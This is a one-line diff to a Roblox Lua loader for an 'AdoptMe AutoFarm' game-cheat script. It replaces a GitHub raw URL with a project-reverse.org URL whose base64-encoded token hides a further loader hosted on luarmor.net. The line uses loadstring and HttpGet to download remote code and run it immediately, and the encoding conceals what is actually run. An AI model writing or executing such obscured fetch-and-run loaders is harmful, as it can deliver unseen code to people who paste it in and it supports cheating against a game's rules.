@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptR0bIox/AdoptMe/refs/heads/main/AutoFarm/script.lua"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2FwaS5sdWFybW9yLm5ldC9maWxlcy92NC9sb2FkZXJzLzRhODczNjA2ZjIwNTNiZjMwNjdhZDZkYTQzYjViYWVlLmx1YSJ9fQ"))()
